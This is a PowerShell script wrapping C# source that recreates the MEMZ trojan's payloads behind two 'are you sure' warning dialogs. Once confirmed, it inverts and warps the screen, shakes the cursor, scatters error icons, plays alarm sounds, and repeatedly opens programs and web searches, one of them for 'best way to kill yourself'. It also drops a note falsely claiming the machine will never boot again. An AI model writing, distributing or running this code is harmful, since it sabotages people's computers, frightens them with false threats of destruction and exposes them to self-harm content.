$MEMZ= @"
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;
using System.Media;
using System.Reflection;
using System.Threading;

namespace MEMZClean {
    public class MAIN {
    [DllImport("USER32.dll", CallingConvention = CallingConvention.StdCall)]
    static extern void SetCursorPos(int X, int Y);

    [DllImport("user32.dll")]
    static extern int GetSystemMetrics(SystemMetric smIndex);

    public enum SystemMetric : int
    {
      SM_CXSCREEN = 0,
      SM_CYSCREEN = 1,
      SM_CYVSCROLL = 2,
      SM_CXVSCROLL = 3,
      SM_CYCAPTION = 4,
      SM_CXBORDER = 5,
      SM_CYBORDER = 6,
      SM_CXDLGFRAME = 7,
      SM_CYDLGFRAME = 8,
      SM_CYVTHUMB = 9,
      SM_CXHTHUMB = 10,
      SM_CXICON = 11,
      SM_CYICON = 12,
      SM_CXCURSOR = 13,
      SM_CYCURSOR = 14,
      SM_CYMENU = 15,
      SM_CXFULLSCREEN = 16,
      SM_CYFULLSCREEN = 17,
      SM_CYKANJIWINDOW = 18,
      SM_MOUSEWHEELPRESENT = 75,
      SM_CYHSCROLL = 20,
      SM_CXHSCROLL = 21,
      SM_DEBUG = 22,
      SM_SWAPBUTTON = 23,
      SM_RESERVED1 = 24,
      SM_RESERVED2 = 25,
      SM_RESERVED3 = 26,
      SM_RESERVED4 = 27,
      SM_CXMIN = 28,
      SM_CYMIN = 29,
      SM_CXSIZE = 30,
      SM_CYSIZE = 31,
      SM_CXFRAME = 32,
      SM_CYFRAME = 33,
      SM_CXMINTRACK = 34,
      SM_CYMINTRACK = 35,
      SM_CXDOUBLECLK = 36,
      SM_CYDOUBLECLK = 37,
      SM_CXICONSPACING = 38,
      SM_CYICONSPACING = 39,
      SM_MENUDROPALIGNMENT = 40,
      SM_PENWINDOWS = 41,
      SM_DBCSENABLED = 42,
      SM_CMOUSEBUTTONS = 43,
      SM_CXFIXEDFRAME = SM_CXDLGFRAME,
      SM_CYFIXEDFRAME = SM_CYDLGFRAME,
      SM_CXSIZEFRAME = SM_CXFRAME,
      SM_CYSIZEFRAME = SM_CYFRAME,
      SM_SECURE = 44,
      SM_CXEDGE = 45,
      SM_CYEDGE = 46,
      SM_CXMINSPACING = 47,
      SM_CYMINSPACING = 48,
      SM_CXSMICON = 49,
      SM_CYSMICON = 50,
      SM_CYSMCAPTION = 51,
      SM_CXSMSIZE = 52,
      SM_CYSMSIZE = 53,
      SM_CXMENUSIZE = 54,
      SM_CYMENUSIZE = 55,
      SM_ARRANGE = 56,
      SM_CXMINIMIZED = 57,
      SM_CYMINIMIZED = 58,
      SM_CXMAXTRACK = 59,
      SM_CYMAXTRACK = 60,
      SM_CXMAXIMIZED = 61,
      SM_CYMAXIMIZED = 62,
      SM_NETWORK = 63,
      SM_CLEANBOOT = 67,
      SM_CXDRAG = 68,
      SM_CYDRAG = 69,
      SM_SHOWSOUNDS = 70,
      SM_CXMENUCHECK = 71,
      SM_CYMENUCHECK = 72,
      SM_SLOWMACHINE = 73,
      SM_MIDEASTENABLED = 74,
      SM_MOUSEPRESENT = 19,
      SM_XVIRTUALSCREEN = 76,
      SM_YVIRTUALSCREEN = 77,
      SM_CXVIRTUALSCREEN = 78,
      SM_CYVIRTUALSCREEN = 79,
      SM_CMONITORS = 80,
      SM_SAMEDISPLAYFORMAT = 81,
      SM_IMMENABLED = 82,
      SM_CXFOCUSBORDER = 83,
      SM_CYFOCUSBORDER = 84,
      SM_TABLETPC = 86,
      SM_MEDIACENTER = 87,
      SM_CMETRICS_OTHER = 76,
      SM_CMETRICS_2000 = 83,
      SM_CMETRICS_NT = 88,
      SM_REMOTESESSION = 0x1000,
      SM_SHUTTINGDOWN = 0x2000,
      SM_REMOTECONTROL = 0x2001,
    }
  [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hWnd);
        [DllImport("user32.dll")]
        static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool SetProcessDPIAware();
 [DllImport("user32.dll", SetLastError = true)]
        public static extern bool DrawIcon(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool GetCursorPos(out POINT lpPoint);
        [DllImport("user32.dll")]
        public static extern bool GetCursorInfo(ref CURSORINFO pci);

        public const Int32 CURSOR_SHOWING = 0x00000001;
        public const Int32 CURSOR_SUPPRESSED = 0x00000002;
        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public Int32 x;
            public Int32 y;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CURSORINFO
        {
            public Int32 cbSize;        // Specifies the size, in bytes, of the structure.
                                        // The caller must set this to Marshal.SizeOf(typeof(CURSORINFO)).
            public Int32 flags;         // Specifies the cursor state. This parameter can be one of the following values:
                                        //    0             The cursor is hidden.
                                        //    CURSOR_SHOWING    The cursor is showing.
                                        //    CURSOR_SUPPRESSED    (Windows 8 and above.) The cursor is suppressed. This flag indicates that the system is not drawing the cursor because the user is providing input through touch or pen instead of the mouse.
            public IntPtr hCursor;          // Handle to the cursor.
            public POINT ptScreenPos;       // A POINT structure that receives the screen coordinates of the cursor.
        }

        [DllImport("user32.dll")]  
        static extern IntPtr LoadIcon(IntPtr hInstance, SystemIcons lpIconName);
        public enum SystemIcons
        {
            IDI_APPLICATION = 32512,
            IDI_HAND = 32513,
            IDI_QUESTION = 32514,
            IDI_EXCLAMATION = 32515,
            IDI_ASTERISK = 32516,
            IDI_WINLOGO = 32517,
            IDI_WARNING = IDI_EXCLAMATION,
            IDI_ERROR = IDI_HAND,
            IDI_INFORMATION = IDI_ASTERISK,
        }

        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest,
        int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        TernaryRasterOperations dwRop);

        [DllImport("gdi32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool BitBlt(IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight,
        IntPtr hdcSrc, int nXSrc, int nYSrc, TernaryRasterOperations dwRop);

        public enum TernaryRasterOperations
        {
            SRCCOPY = 0x00CC0020,
            SRCPAINT = 0x00EE0086,
            SRCAND = 0x008800C6,
            SRCINVERT = 0x00660046,
            SRCERASE = 0x00440328,
            NOTSRCCOPY = 0x00330008,
            NOTSRCERASE = 0x001100A6,
            MERGECOPY = 0x00C000CA,
            MERGEPAINT = 0x00BB0226,
            PATCOPY = 0x00F00021,
            PATPAINT = 0x00FB0A09,
            PATINVERT = 0x005A0049,
            DSTINVERT = 0x00550009,
            BLACKNESS = 0x00000042,
            WHITENESS = 0x00FF0062,
            CAPTUREBLT = 0x40000000
        }

         private void move() {
             SetProcessDPIAware();
                while(true)
                    {
                          POINT point;
                          GetCursorPos(out point);
                          Random random = new Random();
                          Thread.Sleep(10);
                          SetCursorPos(point.x + (random.Next() % 3 - 1), point.y + (random.Next() % 3 - 1));
                    }
         }

          private void drawicon() {
            SetProcessDPIAware();
            
            while(true) {
                CURSORINFO cursorinfo = new CURSORINFO();
                POINT point;
                int ix = GetSystemMetrics(SystemMetric.SM_CXICON) / 2;
                int iy = GetSystemMetrics(SystemMetric.SM_CYICON) / 2;
                GetCursorPos(out point);
                cursorinfo.cbSize = 0x14;
                GetCursorInfo(ref cursorinfo);

                Thread.Sleep(10);
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                DrawIcon(hdc, point.x - ix, point.y - iy, LoadIcon(IntPtr.Zero, SystemIcons.IDI_ERROR));
                }
            }

         private void ScreenInvert() 
            {
                SetProcessDPIAware();
                while(true)
                {
                     IntPtr hwnd = GetDesktopWindow();
                     IntPtr hdc = GetWindowDC(hwnd);
                     int x = GetSystemMetrics(SystemMetric.SM_CXSCREEN);
                     int y = GetSystemMetrics(SystemMetric.SM_CYSCREEN);
                     StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY);
                     Thread.Sleep(1000);
                }
            }

    private void TAB() 
    {
        while(true) 
        {
            Random random = new Random();
                            int rnd_pgm = random.Next(46);

            {
                if (rnd_pgm == 1)
                {
                    Process.Start("http://google.co.ck/search?q=best+way+to+kill+yourself");
                }
            }

            {
                if (rnd_pgm == 2)
                {
                    Process.Start("http://google.co.ck/search?q=how+2+remove+a+virus");
                }
            }

            {
                if (rnd_pgm == 3)
                {
                    Process.Start("http://google.co.ck/search?q=mcafee+vs+norton");
                }
            }

            {
                if (rnd_pgm == 4)
                {
                    Process.Start("http://google.co.ck/search?q=how+to+send+a+virus+to+my+friend");
                }
            }

            {
                if (rnd_pgm == 5)
                {
                    Process.Start("http://google.co.ck/search?q=minecraft+hax+download+no+virus");
                }
            }

            {
                if (rnd_pgm == 6)
                {
                    Process.Start("http://google.co.ck/search?q=how+to+get+money");
                }
            }

            {
                if (rnd_pgm == 7)
                {
                    Process.Start("http://google.co.ck/search?q=bonzi+buddy+download+free");
                }
            }

            {
                if (rnd_pgm == 8)
                {
                    Process.Start("http://google.co.ck/search?q=how+2+buy+weed");
                }
            }

            {
                if (rnd_pgm == 9)
                {
                    Process.Start("http://google.co.ck/search?q=how+to+code+a+virus+in+visual+basic");
                }
            }

            {
                if (rnd_pgm == 10)
                {
                    Process.Start("http://google.co.ck/search?q=what+happens+if+you+delete+system32");
                }
            }

            {
                if (rnd_pgm == 11)
                {
                    Process.Start("http://google.co.ck/search?q=g3t+r3kt");
                }
            }

            {
                if (rnd_pgm == 12)
                {
                    Process.Start("http://google.co.ck/search?q=batch+virus+download");
                }
            }

            {
                if (rnd_pgm == 13)
                {
                    Process.Start("http://google.co.ck/search?q=virus.exe");
                }
            }

            {
                if (rnd_pgm == 14)
                {
                    Process.Start("http://google.co.ck/search?q=internet+explorer+is+the+best+browser");
                }
            }

            {
                if (rnd_pgm == 15)
                {
                    Process.Start("http://google.co.ck/search?q=facebook+hacking+tool+free+download+no+virus+working+2016");
                }
            }

            {
                if (rnd_pgm == 16)
                {
                    Process.Start("http://google.co.ck/search?q=virus+builder+legit+free+download");
                }
            }

            {
                if (rnd_pgm == 17)
                {
                    Process.Start("http://google.co.ck/search?q=how+to+create+your+own+ransomware");
                }
            }
            {
                if (rnd_pgm == 18)
                {
                    Process.Start("http://google.co.ck/search?q=how+to+remove+memz+trojan+virus");
                }
            }
            {
                if (rnd_pgm == 19)
                {
                    Process.Start("http://google.co.ck/search?q=my+computer+is+doing+weird+things+wtf+is+happenin+plz+halp");
                }
            }
            {
                if (rnd_pgm == 20)
                {
                    Process.Start("http://google.co.ck/search?q=dank+memz");
                }
            }
            {
                if (rnd_pgm == 21)
                {
                    Process.Start("http://google.co.ck/search?q=how+to+download+memz");
                }
            }
            {
                if (rnd_pgm == 22)
                {
                    Process.Start("http://google.co.ck/search?q=half+life+3+release+date");
                }
            }
            {
                if (rnd_pgm == 23)
                {
                    Process.Start("http://google.co.ck/search?q=is+illuminati+real");
                }
            }
            {
                if (rnd_pgm == 24)
                {
                    Process.Start("http://google.co.ck/search?q=montage+parody+making+program+2016");
                }
            }
            {
                if (rnd_pgm == 25)
                {
                    Process.Start("http://google.co.ck/search?q=the+memz+are+real");
                }
            }
            {
                if (rnd_pgm == 26)
                {
                    Process.Start("http://google.co.ck/search?q=stanky+danky+maymays");
                }
            }
            {
                if (rnd_pgm == 27)
                {
                    Process.Start("http://google.co.ck/search?q=john+cena+midi+legit+not+converted");
                }
            }
            {
                if (rnd_pgm == 28)
                {
                    Process.Start("http://google.co.ck/search?q=vinesauce+meme+collection");
                }
            }
            {
                if (rnd_pgm == 29)
                {
                    Process.Start("http://google.co.ck/search?q=skrillex+scay+onster+an+nice+sprites+midi");
                }
            }
            {
                if (rnd_pgm == 30)
                {
                    Process.Start("http://answers.microsoft.com/en-us/protect/forum/protect_other-protect_scanning/memz-malwarevirus-trojan-completely-destroying/268bc1c2-39f4-42f8-90c2-597a673b6b45");
                }
            }
            {
                if (rnd_pgm == 31)
                {
                    Process.Start("http://motherboard.vice.com/read/watch-this-malware-turn-a-computer-into-a-digital-hellscape");
                }
            }
            {
                if (rnd_pgm == 32)
                {
                    Process.Start("http://play.clubpenguin.com");
                }
            }
            {
                if (rnd_pgm == 33)
                {
                    Process.Start("http://pcoptimizerpro.com");
                }
            }
            {
                if (rnd_pgm == 34)
                {
                    Process.Start("http://softonic.com");
                }
            }
            {
                if (rnd_pgm == 35)
                {
                    Process.Start("calc");
                }
            }
            {
                if (rnd_pgm == 36)
                {
                    Process.Start("notepad");
                }
            }
            {
                if (rnd_pgm == 37)
                {
                    Process.Start("cmd");
                }
            }
            {
                if (rnd_pgm == 38)
                {
                    Process.Start("write");
                }
            }
            {
                if (rnd_pgm == 39)
                {
                    ProcessStartInfo p = new ProcessStartInfo();
                    p.FileName = "cmd.exe";
                    p.Arguments = "/k regedit";
                    p.CreateNoWindow = true;
                    p.WindowStyle = ProcessWindowStyle.Hidden;
                    p.ErrorDialog = false;
                    Process.Start(p);
                }
            }
            {
                if (rnd_pgm == 40)
                {
                    Process.Start("explorer");
                }
            }
            {
                if (rnd_pgm == 41)
                {
                    Process.Start("taskmgr");
                }
            }
            {
                if (rnd_pgm == 42)
                {
                    Process.Start("msconfig");
                }
            }
            {
                if (rnd_pgm == 43)
                {
                    Process.Start("mspaint");
                }
            }
            {
                if (rnd_pgm == 44)
                {
                    Process.Start("devmgmt.msc");
                }
            }
            {
                if (rnd_pgm == 45)
                {
                    Process.Start("control");
                }
            }
                {
                    if (rnd_pgm == 46)
                    {
                        Process.Start("mmc");
                    }
                }
                Thread.Sleep(10000);
            }
        }

            private void tunnel() {
                SetProcessDPIAware();
                int cx = GetSystemMetrics(SystemMetric.SM_CXSCREEN);
                int cy = GetSystemMetrics(SystemMetric.SM_CYSCREEN);
            
                while(true)
                {
                    IntPtr hdc = GetDC(IntPtr.Zero);
            
                    StretchBlt(hdc, 50, 50, cx - 100, cy - 100, hdc, 0, 0, cx, cy, TernaryRasterOperations.SRCCOPY);
                    Thread.Sleep(800);
                }
            } 
            private void randomposicon() {
                SetProcessDPIAware();
                IntPtr hdc = GetDC(IntPtr.Zero);
                while (true) {
                    Random r = new Random();
                    int gx = GetSystemMetrics(SystemMetric.SM_CXSCREEN);
                    int gy = GetSystemMetrics(SystemMetric.SM_CYSCREEN);
                    int x = r.Next(gx);
                    int y = r.Next(gy);
                    DrawIcon(hdc, x, y, LoadIcon(IntPtr.Zero, SystemIcons.IDI_WARNING));
                    Thread.Sleep(3000);
                }
            }
            private void notepad() {
                using (StreamWriter w = new StreamWriter("note.txt"))
                {
                    w.WriteLine("YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.\nYour computer won't boot up again, so use it as long as you can!\n:D\nTrying to kill MEMZ will cause your system to be destroyed instantly, so don't try it :D");
                }

                Process.Start("notepad", "note.txt");
                }

            private void sound() {
             while (true) {
                Random r = new Random();
                int rs = r.Next(0, 2);
                    {
                        if (rs == 0)
                        {
                            SystemSounds.Hand.Play();
                        }
                    }

                    {
                        if (rs == 1)
                        {
                            SystemSounds.Exclamation.Play();
                        }
                    }
                    Thread.Sleep(300);
                }
            }
            private void stre() {
                while (true) {
                    Random r = new Random();
                    IntPtr hdc = GetDC(IntPtr.Zero);
                    int gx1 = GetSystemMetrics(SystemMetric.SM_CXSCREEN);
                    int gy1 = GetSystemMetrics(SystemMetric.SM_CYSCREEN);
                    int x = r.Next(gx1);
                    int y = r.Next(gy1);
                    StretchBlt(hdc, x, y, x, y, hdc, 0, 0, gx1, gy1, TernaryRasterOperations.SRCCOPY);
                    Thread.Sleep(5000);
                }
            }

            public static void intmain() {
                MEMZClean.MAIN ptr35 = new MEMZClean.MAIN();
                Thread note = new Thread(ptr35.notepad);
                Thread sou = new Thread(ptr35.sound);
                Thread ope = new Thread(ptr35.TAB);
                Thread errorico = new Thread(ptr35.drawicon);
                Thread si = new Thread(ptr35.ScreenInvert);
                Thread tun = new Thread(ptr35.tunnel);
                Thread cur = new Thread(ptr35.move);
                Thread war = new Thread(ptr35.randomposicon);
                Thread dup = new Thread(ptr35.stre);

                note.Start();
                Thread.Sleep(30000);
                ope.Start();
                Thread.Sleep(30000);
                cur.Start();
                Thread.Sleep(10000);
                sou.Start();
                Thread.Sleep(35000);
                si.Start();
                Thread.Sleep(35000);
                war.Start();
                errorico.Start();
                Thread.Sleep(35000);
                tun.Start();
                Thread.Sleep(7000);
                dup.Start();
                }
            }
    }
"@

Add-Type -TypeDefinition $MEMZ -Language CSharp
Add-Type -AssemblyName PresentationCore,PresentationFramework
      $WARNING = [System.Windows.MessageBox]::Show('The software you just executed is considered malware
This malware will harm your computer and maked it unusable
If you are seeing this message without knowing what you just executed, simply press No and nothing will heppen.
If you know what this malware does and are using a safe environment to test press Yes to start it.

DO YOU WANT TO EXECUTE THIS MALWARE. RESULTING IN AN UNUSABLE MACHINE?','MEMZ - original creator by Leurak, code by ptr35','YesNo','Warning')
      switch  ($WARNING) {

        'Yes' {
      
            $FINAL = [System.Windows.MessageBox]::Show('THIS IS THE LAST WARNING!
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!

STILL EXECUTE IT?','MEMZ - original creator by Leurak, code by ptr35','YesNo','Warning')

            switch  ($FINAL) {
                'Yes' {
                    [MEMZClean.MAIN]::intmain()
                }

                'No' {
                    exit
                }

            }

        }
      
        'No' {
      
        exit
      
        }
    }